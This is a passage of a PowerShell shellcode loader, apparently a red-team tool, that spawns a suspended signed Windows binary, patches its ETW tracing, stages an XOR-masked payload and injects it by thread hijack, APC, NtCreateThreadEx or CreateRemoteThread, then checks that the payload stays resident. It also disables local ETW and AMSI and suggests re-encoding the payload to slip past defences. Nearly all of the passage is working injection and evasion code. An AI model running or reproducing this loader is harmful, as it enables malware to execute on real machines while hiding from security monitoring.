        $addr = [IntPtr]([long]($localNtdll.ToInt64() + [long]$rva))
        $buf = $null
        if ([RT]::ReadRemote($hProcess, $addr, 1, [ref]$buf) -and $buf[0] -eq 0x33) { continue }
        if ([RT]::PatchRemote($hProcess, $addr, $bytes)) { $n++ }
    }
    if ($n -gt 0) { Write-V ('host ETW patched: {0} export(s)  ->  33 C0 C3' -f $n) '+' 'Green' }
    else { Write-V 'host ETW unchanged (already patched or unavailable)' '=' 'DarkGray' }
}

# ---------------------------------------------------------------------------
#  Stage 4 - injection primitives
# ---------------------------------------------------------------------------

function Invoke-HijackInjection {
    param([IntPtr]$hThread, [IntPtr]$target)

    $size = [System.Runtime.InteropServices.Marshal]::SizeOf([type][RT+CONTEXT])
    $raw  = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size + 16)
    try {
        $aligned = [IntPtr](([long]$raw.ToInt64() + 15) -band (-bnot 15))
        $ctx = New-Object RT+CONTEXT
        $ctx.Trailing = New-Object byte[] 976
        $ctx.ContextFlags = [RT]::CONTEXT_CONTROL -bor [RT]::CONTEXT_INTEGER
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($ctx, $aligned, $false)

        if (-not [RT]::GetThreadContext($hThread, $aligned)) {
            throw ('GetThreadContext failed, win32=' + [System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
        }
        $ctx = [System.Runtime.InteropServices.Marshal]::PtrToStructure($aligned, [type][RT+CONTEXT])
        Write-V ('thread context: rip=0x{0:X}  rsp=0x{1:X}' -f $ctx.Rip, $ctx.Rsp) '=' 'DarkGray'
        $ctx.Rip = [uint64]$target.ToInt64()
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($ctx, $aligned, $false)

        if (-not [RT]::SetThreadContext($hThread, $aligned)) {
            throw ('SetThreadContext failed, win32=' + [System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
        }
        Write-V ('thread context: rip -> 0x{0:X}  (entry hijacked)' -f $target.ToInt64()) '+' 'Green'
        $prev = [RT]::ResumeThread($hThread)
        Write-V ('ResumeThread -> previous suspend count = {0}' -f $prev) '=' 'DarkGray'
    }
    finally {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($raw)
    }
}

function Invoke-ApcInjection {
    param([IntPtr]$hThread, [IntPtr]$target)
    if (-not [RT]::QueueUserAPC($target, $hThread, [UIntPtr]::Zero)) {
        throw ('QueueUserAPC failed, win32=' + [System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
    }
    Write-V ('APC queued: routine=0x{0:X} thread={1}' -f $target.ToInt64(), $hThread.ToInt64()) '+' 'Green'
    $prev = [RT]::ResumeThread($hThread)
    Write-V ('ResumeThread -> previous suspend count = {0}' -f $prev) '=' 'DarkGray'
    Write-V 'main thread resumed, APC dispatches at first alertable wait' '+' 'Green'
}

function Invoke-NtCreateThreadInjection {
    param([IntPtr]$hProcess, [IntPtr]$target, [bool]$HoldMain, [IntPtr]$hMainThread)

    $ntdll = [RT]::GetModuleHandleA('ntdll.dll')
    $pNt   = [RT]::GetProcAddress($ntdll, 'NtCreateThreadEx')
    if ($pNt -eq [IntPtr]::Zero) { throw 'NtCreateThreadEx not resolvable' }

    $fn = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pNt, [type][RT+NtCreateThreadExDelegate])
    $hThread = [IntPtr]::Zero
    $st = $fn.Invoke([ref]$hThread, [RT]::THREAD_ALL_ACCESS, [IntPtr]::Zero, $hProcess,
                     $target, [IntPtr]::Zero, 0, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($st -ne 0) { throw ('NtCreateThreadEx status=0x{0:X8}' -f $st) }
    [void][RT]::CloseHandle($hThread)
    Write-V ('NtCreateThreadEx: routed 0x{0:X} on new thread (status=0)' -f $target.ToInt64()) '+' 'Green'
    if ($HoldMain) {
        Write-V 'main thread left suspended - host cannot self-terminate' '+' 'Green'
    } else {
        [void][RT]::ResumeThread($hMainThread)
        Write-V 'main thread resumed' '+' 'Green'
    }
}

function Invoke-CreateRemoteThreadInjection {
    param([IntPtr]$hProcess, [IntPtr]$target)
    $tid = 0
    $h = [RT]::CreateRemoteThread($hProcess, [IntPtr]::Zero, [UIntPtr]::Zero, $target, [IntPtr]::Zero, 0, [ref]$tid)
    if ($h -eq [IntPtr]::Zero) {
        throw ('CreateRemoteThread failed, win32=' + [System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
    }
    [void][RT]::CloseHandle($h)
    Write-V ('CreateRemoteThread: tid={0} start=0x{1:X}' -f $tid, $target.ToInt64()) '+' 'Green'
}

# ---------------------------------------------------------------------------
#  Stage 5 - health telemetry
# ---------------------------------------------------------------------------

function Measure-HostHealth {
    param(
        [IntPtr]$hProcess,
        [int]$ProcessId,
        [IntPtr]$PayloadBase,
        [byte[]]$Reference,
        [int]$Seconds,
        [int]$PollMs
    )

    $probeLen = [Math]::Min(64, $Reference.Length)
    $refHead  = $Reference[0..($probeLen - 1)]
    $deadline = [DateTime]::UtcNow.AddSeconds($Seconds)
    $samples  = 0
    $seenAlive = $false
    $lastState = $null
    $result = [ordered]@{
        Verdict   = 'unknown'
        Alive     = $false
        ExitCode  = $null
        Intact    = $true
        PageState = $null
        Protect   = $null
        Duration  = 0
        Samples   = 0
        Detail    = ''
    }

    $nextBeat = 2.0

    while ([DateTime]::UtcNow -lt $deadline) {
        $samples++
        $elapsed = [Math]::Round($Seconds - ($deadline - [DateTime]::UtcNow).TotalSeconds, 1)

        [uint32]$code = 0
        $alive = [RT]::GetExitCodeProcess($hProcess, [ref]$code) -and ($code -eq [RT]::STILL_ACTIVE)

        $intact = $true
        $state = [uint32]0; $protect = [uint32]0
        $qOk = [RT]::QueryRemote($hProcess, $PayloadBase, [ref]$state, [ref]$protect)
        $buf = $null
        $rdOk = [RT]::ReadRemote($hProcess, $PayloadBase, $probeLen, [ref]$buf)

        if ($qOk) {
            if ($state -ne [RT]::MEM_COMMIT) { $intact = $false }
            elseif (($protect -band [RT]::PAGE_GUARD) -ne 0) { $intact = $false }
            elseif (($protect -band [RT]::PAGE_NOACCESS) -ne 0) { $intact = $false }
        }
        if (-not $rdOk) { $intact = $false }
        elseif ($buf) {
            for ($i = 0; $i -lt $probeLen; $i++) {
                if ($buf[$i] -ne $refHead[$i]) { $intact = $false; break }
            }
        }

        $lastState = [pscustomobject]@{ Alive = $alive; Code = $code; Intact = $intact; State = $state; Protect = $protect }

        if ($alive) { $seenAlive = $true }

        if (-not $alive) {
            $mark = 'intact'
            if (-not $intact) { $mark = 'wiped' }
            Write-V ('[{0,4:N1}s] host terminated  exit=0x{1:X8}  payload={2}' -f $elapsed, $code, $mark) '-' 'Red'
            break
        }

        if (-not $intact) {
            Write-V ('[{0,4:N1}s] payload region altered  state=0x{1:X}  protect=0x{2:X}' -f $elapsed, $state, $protect) '!' 'Yellow'
        }
        elseif ($elapsed -ge $nextBeat -or $samples -eq 1) {
            Write-V ('[{0,4:N1}s] alive  region=commit/0x{1:X}  bytes=intact' -f $elapsed, $protect) '=' 'DarkGray'
            $nextBeat = $elapsed + 2.0
        }

        [System.Threading.Thread]::Sleep($PollMs)
    }

    [uint32]$code = 0
    $finalAlive = [RT]::GetExitCodeProcess($hProcess, [ref]$code) -and ($code -eq [RT]::STILL_ACTIVE)

    $result.Alive     = $finalAlive
    $result.ExitCode  = $code
    $result.Samples   = $samples
    $result.Duration  = [Math]::Round(($Seconds - [Math]::Max(0, ($deadline - [DateTime]::UtcNow).TotalSeconds)), 2)
    if ($lastState) { $result.Intact = $lastState.Intact; $result.PageState = $lastState.State; $result.Protect = $lastState.Protect }

    if (-not $finalAlive) {
        if ($code -eq 0) {
            $result.Verdict = 'exited-clean'
            $result.Detail  = 'host returned from its entry point and exited 0'
        }
        elseif ($code -ge 2147483648) {
            # 0x80000000+ is an NTSTATUS fault code, not an ordinary exit code
            $result.Verdict = 'crashed'
            $result.Detail  = ('fault, NTSTATUS=0x{0:X8}' -f $code)
        }
        else {
            $result.Verdict = 'lost-host'
            $result.Detail  = ('host exited with code {0} before the window closed - payload no longer resident' -f $code)
        }
    }
    elseif ($lastState -and -not $lastState.Intact) {
        $result.Verdict = 'tampered'
        $result.Detail  = 'host alive but injected region was cleared or re-protected'
    }
    elseif ($seenAlive) {
        $result.Verdict = 'healthy'
        $result.Detail  = ('resident for full {0}s window' -f $Seconds)
    }
    else {
        $result.Verdict = 'unknown'
        $result.Detail  = 'no samples collected'
    }

    return [pscustomobject]$result
}

# ---------------------------------------------------------------------------
#  Stage 6 - orchestration
# ---------------------------------------------------------------------------

function Invoke-Attempt {
    param(
        [byte[]]$Payload,
        [string]$Technique,
        [string]$Exe,
        [string]$Arguments,
        [int]$Index,
        [byte[]]$PayloadCold = $null,
        [int]$Warmup = 0
    )

    Write-Host ''
    Write-V ('attempt {0}/{1}  technique={2}' -f $Index, $MaxAttempts, $Technique) '>' 'Magenta'

    $pi = $null
    $hProcess = [IntPtr]::Zero
    $hThread  = [IntPtr]::Zero
    $payloadBase = [IntPtr]::Zero
    $record = [ordered]@{
        Attempt = $Index; Technique = $Technique; Pid = 0; Verdict = 'error'
        ExitCode = $null; Detail = ''; Address = ''
    }

    try {
        $pi = Start-SuspendedHost -Exe $Exe -Arguments $Arguments
        $hProcess = $pi.hProcess
        $hThread  = $pi.hThread
        $record.Pid = $pi.dwProcessId

        if (-not $NoEtw) { Disable-EtwRemote -hProcess $hProcess }

        # stage the payload: either straight to RX, or encrypted/RW first and only
        # decrypted once the warmup window has elapsed
        $written = [IntPtr]::Zero
        if ($Warmup -gt 0 -and $PayloadCold) {
            $payloadBase = [RT]::AllocRemoteRaw($hProcess, $PayloadCold, [ref]$written)
            if ($payloadBase -eq [IntPtr]::Zero) {
                throw ('cold staging failed, win32=' + [System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
            }
            $record.Address = ('0x{0:X}' -f $payloadBase.ToInt64())
            Write-V ('cold stage  base={0}  size={1}  RW only, contents encrypted' -f $record.Address, $PayloadCold.Length) '+' 'Green'
            Write-V ('warmup: holding {0}s before decrypt' -f $Warmup) '=' 'DarkGray'
            Start-Sleep -Seconds $Warmup
            if (-not [RT]::WriteRemote($hProcess, $payloadBase, $Payload)) { throw 'decrypt-in-place write failed' }
            if (-not [RT]::ProtectRemote($hProcess, $payloadBase, $Payload.Length, [RT]::PAGE_EXECUTE_READ)) {
                throw 'protect RX failed after decrypt'
            }
            Write-V ('decrypted in place, flipped RW -> RX (t+{0}s)' -f $Warmup) '+' 'Green'
        }
        else {
            $payloadBase = [RT]::AllocRemote($hProcess, $Payload, [ref]$written)
            if ($payloadBase -eq [IntPtr]::Zero) {
                throw ('remote allocation failed, win32=' + [System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
            }
            $record.Address = ('0x{0:X}' -f $payloadBase.ToInt64())
            Write-V ('payload mapped  base={0}  size={1}  RW->RX' -f $record.Address, $Payload.Length) '+' 'Green'
        }

        $check = $null
        if ([RT]::ReadRemote($hProcess, $payloadBase, [Math]::Min(16, $Payload.Length), [ref]$check)) {
            $cmp = $true
            for ($k = 0; $k -lt $check.Length; $k++) {
                if ($check[$k] -ne $Payload[$k]) { $cmp = $false; break }
            }
            $sig = '+'; $col = 'Green'
            if (-not $cmp) { $sig = '-'; $col = 'Red' }
            Write-V ('write-back verified: {0}  head={1}' -f $cmp, (($check | ForEach-Object { $_.ToString('x2') }) -join ' ')) $sig $col
        }

        if ($DryRun) {
            Write-V 'DRY RUN: injection and monitoring stages skipped' '=' 'DarkGray'
            [void][RT]::TerminateProcess($hProcess, 0)
            $record.Verdict = 'dryrun'
            $record.Detail  = 'spawn / ETW patch / alloc / write / protect validated'
            return [pscustomobject]$record
        }

        if ($NoInject) { Write-V 'NoInject: monitoring a suspended host' '!' 'Yellow' } else {
        switch ($Technique) {
            'Hijack'           { Invoke-HijackInjection -hThread $hThread -target $payloadBase }
            'Apc'              { Invoke-ApcInjection -hThread $hThread -target $payloadBase }
            'RemoteThread'     { Invoke-NtCreateThreadInjection -hProcess $hProcess -target $payloadBase -HoldMain (-not $NoHoldMain) -hMainThread $hThread }
            'CreateRemoteThread' { Invoke-CreateRemoteThreadInjection -hProcess $hProcess -target $payloadBase }
            default            { throw "unknown technique: $Technique" }
        } }

        Write-V 'health monitor starting' '=' 'DarkGray'
        $health = Measure-HostHealth -hProcess $hProcess -ProcessId $pi.dwProcessId -PayloadBase $payloadBase `
                                     -Reference $Payload -Seconds $MonitorSeconds -PollMs $PollMs

        $record.Verdict  = $health.Verdict
        $record.ExitCode = $health.ExitCode
        $record.Detail   = $health.Detail

        $color = 'Red'
        if ($health.Verdict -eq 'healthy') { $color = 'Green' }
        elseif ($health.Verdict -eq 'exited-clean') { $color = 'Yellow' }
        Write-V ('health: {0}  alive={1}  exit={2}  intact={3}  {4}' -f `
                 $health.Verdict, $health.Alive, $health.ExitCode, $health.Intact, $health.Detail) $(if ($health.Verdict -eq 'healthy') { '+' } else { '-' }) $color

        if ($health.Verdict -ne 'healthy' -and -not $KeepHostOnFail -and -not $hProcess.Equals([IntPtr]::Zero)) {
            try { [void][RT]::TerminateProcess($hProcess, 0) } catch { }
            Write-V 'residual host terminated' '=' 'DarkGray'
        }
    }
    catch {
        $record.Verdict = 'error'
        $record.Detail  = $_.Exception.Message
        Write-V ('attempt aborted: ' + $_.Exception.Message) '-' 'Red'
        if ($hProcess -ne [IntPtr]::Zero) { try { [void][RT]::TerminateProcess($hProcess, 0) } catch { } }
    }
    finally {
        if ($hProcess -ne [IntPtr]::Zero) { [void][RT]::CloseHandle($hProcess) }
        if ($hThread  -ne [IntPtr]::Zero) { [void][RT]::CloseHandle($hThread) }
    }

    return [pscustomobject]$record
}

function Get-TechniqueCycle {
    if ($Method -ne 'Auto') { return @($Method) }
    # regasm.exe has a near-zero natural lifetime, so methods that let the host
    # reach its own entry point are ordered last: they only survive if the
    # payload takes the process over before the host returns.
    return @('Hijack', 'RemoteThread', 'Apc', 'CreateRemoteThread')
}

# ---------------------------------------------------------------------------
#  Main
# ---------------------------------------------------------------------------

Write-Banner
Write-V ('powershell {0}  |  x64={1}  |  pid={2}' -f $PSVersionTable.PSVersion, [Environment]::Is64BitProcess, $PID)

if (-not $NoEtw)  { Write-V 'hardening local ETW surface' ; Disable-EtwLocal }
if ($Amsi) { Write-V 'hardening local AMSI surface' ; Disable-AmsiLocal }

# ---- payload
$sw = [Diagnostics.Stopwatch]::StartNew()
if ($DryRun) {
    Write-V 'DRY RUN - synthetic 4 KiB buffer, no network, no execution'
    $payload = [byte[]]::new(4096)
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($payload); $rng.Dispose()
    $payload[0] = 0xC3
    $blobInfo = Get-BlobProfile -Data $payload
} else {
    $payload = Get-ShellcodeBytes
    $blobInfo = Get-BlobProfile -Data $payload
}
Write-V ('payload acquired in {0} ms' -f $sw.ElapsedMilliseconds) '+' 'Green'
Write-V ('size={0} bytes   sha256={1}' -f $blobInfo.Length, $blobInfo.Sha256)
Write-V ('head={0}   MZ={1}  PE={2}  (raw shellcode expected: MZ=False)' -f $blobInfo.Head, $blobInfo.IsMZ, $blobInfo.IsPE)
if ($blobInfo.IsPE) { Write-V 'blob carries a PE header - loader expects raw position-independent shellcode' '!' 'Yellow' }

if (-not $NoEncrypt -and -not $DryRun) {
    $blob = New-XorBlob -Data $payload
    Write-V 'payload masked in process memory (XOR-32, key held in script scope)' '+' 'Green'
}

$hostSource = Resolve-RedTeamHost
Write-V ('host resolved: {0}' -f $hostSource) '+' 'Green'
$hostVersion = (Get-Item -LiteralPath $hostSource).VersionInfo.FileVersion
$hostSig = Get-AuthenticodeSignature -LiteralPath $hostSource -ErrorAction SilentlyContinue
if ($hostSig) { Write-V ('host signature: {0}  ({1})' -f $hostSig.Status, $hostVersion) '=' 'DarkGray' }
else { Write-V ('host signature: unresolved  ({0})' -f $hostVersion) '=' 'DarkGray' }

$hostPath = Initialize-DecoyHost -SourceExe $hostSource

$cycle = @(Get-TechniqueCycle)
Write-V ('technique cycle: {0}' -f ($cycle -join ' -> ')) '=' 'DarkGray'

$coldBytes = $null
if ($WarmupSeconds -gt 0 -and -not $DryRun) {
    if (-not $NoEncrypt) { $coldBytes = $blob.Data }
    else {
        $tmp = New-XorBlob -Data $payload
        $coldBytes = $tmp.Data
    }
    Write-V ('warmup mode: cold staging stays encrypted for {0}s (RW, non-executable)' -f $WarmupSeconds) '=' 'DarkGray'
}

$results = @()
$winner = $null

for ($i = 1; $i -le $MaxAttempts; $i++) {
    $tech = $cycle[($i - 1) % $cycle.Count]

    $scrub = $false
    if (-not $NoEncrypt -and -not $DryRun) {
        $plain = Un-XorBlob -Data $blob.Data -Key $blob.Key
        $scrub = $true
    }
    else { $plain = $payload }

    $r = Invoke-Attempt -Payload $plain -Technique $tech -Exe $hostPath -Arguments $HostArguments -Index $i -PayloadCold $coldBytes -Warmup $WarmupSeconds
    $results += $r

    # scrub only the decrypted staging copy - never the master blob
    if ($scrub -and $plain) { [Array]::Clear($plain, 0, $plain.Length) }

    if ($DryRun) { break }

    if ($r.Verdict -eq 'healthy') { $winner = $r; break }

    if ($i -lt $MaxAttempts) {
        $jitter = Get-Random -Minimum 0 -Maximum 400
        Write-V ('falling back to next technique in {0} ms' -f ($RetryDelayMs + $jitter)) '!' 'Yellow'
        Start-Sleep -Milliseconds ($RetryDelayMs + $jitter)
    }
}

# ---------------------------------------------------------------------------
#  Report
# ---------------------------------------------------------------------------

Write-Host ''
Write-Host '  ------------------------------------------------------------------' -ForegroundColor DarkCyan
Write-Host '   ATTEMPT LOG' -ForegroundColor Cyan
Write-Host '  ------------------------------------------------------------------' -ForegroundColor DarkCyan
$results | ForEach-Object {
    $line = '   {0,2}  {1,-18} pid={2,-6} {3,-11} {4}' -f $_.Attempt, $_.Technique, $_.Pid, $_.Verdict, $_.Detail
    $c = 'Gray'
    switch ($_.Verdict) {
        'healthy'      { $c = 'Green' }
        'crashed'      { $c = 'Red' }
        'error'        { $c = 'Red' }
        'lost-host'    { $c = 'Yellow' }
        'exited-clean' { $c = 'Yellow' }
        'tampered'     { $c = 'Yellow' }
        'dryrun'       { $c = 'Cyan' }
    }
    Write-Host $line -ForegroundColor $c
}
Write-Host '  ------------------------------------------------------------------' -ForegroundColor DarkCyan

if ($winner) {
    Write-Host ''
    Write-V ('STABLE DELIVERY  technique={0}  pid={1}  base={2}  window={3}s' -f $winner.Technique, $winner.Pid, $winner.Address, $MonitorSeconds) '+' 'Green'
    Write-Host ''
    Write-Host '  payload is resident and the host did not crash or clear the region.' -ForegroundColor DarkGray
    Write-Host ('  host pid {0} is live - inspect with: Get-Process -Id {0}' -f $winner.Pid) -ForegroundColor DarkGray
}
elseif ($DryRun) {
    Write-Host ''
    Write-V 'DRY RUN complete - pipeline validated end to end' '+' 'Green'
}
else {
    Write-Host ''
    Write-V ('no technique survived {0} attempts - payload or host is being neutralised' -f $MaxAttempts) '-' 'Red'
    Write-Host '  next moves: swap -Method, try -HostExe with a longer-lived signed binary,' -ForegroundColor DarkGray
    Write-Host '  or re-sign/re-encode the payload so its in-memory shape changes.' -ForegroundColor DarkGray
}

if ($script:StageDir -and (Test-Path -LiteralPath $script:StageDir)) {
    try { Remove-Item -LiteralPath $script:StageDir -Recurse -Force -ErrorAction Stop; Write-V 'staging directory removed' '=' 'DarkGray' }
    catch { Write-V ('staging directory left in place: {0}' -f $script:StageDir) '=' 'DarkGray' }
}

Write-Host ''
Write-V ('complete in {0:F2}s' -f $script:Clock.Elapsed.TotalSeconds) '=' 'DarkGray'






